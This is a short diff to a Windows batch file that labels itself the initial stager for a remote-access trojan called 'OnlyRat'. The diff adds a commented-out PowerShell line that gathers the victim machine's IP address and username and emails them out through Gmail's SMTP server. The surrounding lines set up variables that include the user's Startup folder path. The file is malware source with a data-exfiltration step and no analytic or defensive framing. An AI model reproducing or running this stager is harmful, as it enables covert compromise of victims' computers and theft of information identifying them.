@@ -2,6 +2,9 @@
 @REM inital stager for RAT
 @REM created by : C0SM0
 
+@REM setup smtp
+@REM powershell $email = "example@gmail.com"; $password = "password"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "OnlyRat: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);
+
 @REM variables
 set "INITIALPATH=%cd%"
 set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
